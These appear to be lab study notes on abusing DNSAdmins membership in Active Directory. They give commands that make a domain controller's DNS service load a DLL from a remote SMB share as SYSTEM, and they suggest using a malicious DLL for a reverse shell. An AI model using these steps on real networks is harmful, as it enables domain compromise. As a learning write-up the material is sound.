# Abusing DNSAdmins Group

- Possible for members of DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).
- In case the DC also serves as DNS, this will provide us escalation to DA.
- Need privileges to restart the DNS service.


1. Enumerate the members of the DNSAdmis group
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```

2. Once we know the members of the DNSAdmins group, we need to
compromise a member. We already have hash of srvadmin because of
derivative local admin

3. From the privileges of DNSAdmins group member, configure DLL using dnscmd.exe (needs RSAT DNS):

```powershell
dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll
```

At this point, the registry values `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\DNS\Parameters` value `ServerLevelPluginDll` will be updated with `\\172.16.50.100\dll\mimilib.dll`

4. Using cmd start and stop the service
```powershell
sc \\dcorp-dc stop dns

sc \\dcorp-dc start dns
```

	We can weaponize this method by loading malicious DLL and running them (DLL injection attack) for a reverse shell etc to gain system level privileges on the domain controller